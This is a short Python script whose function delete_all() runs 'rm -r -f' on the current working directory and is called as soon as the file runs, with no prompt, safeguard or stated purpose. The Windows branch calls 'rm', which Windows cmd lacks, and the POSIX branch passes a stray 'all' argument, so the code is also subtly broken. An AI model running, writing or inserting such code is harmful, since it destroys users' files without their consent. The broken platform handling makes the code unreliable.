import os

def delete_all():
    if os.name == 'nt':  # For Windows
        os.system(f"rm -r -f {os.getcwd()}")
    elif os.name == 'posix':  # For Linux and macOS
        os.system(f"rm -r -f all {os.getcwd()}")
    else:
        print("Unsupported operating system.")

delete_all()
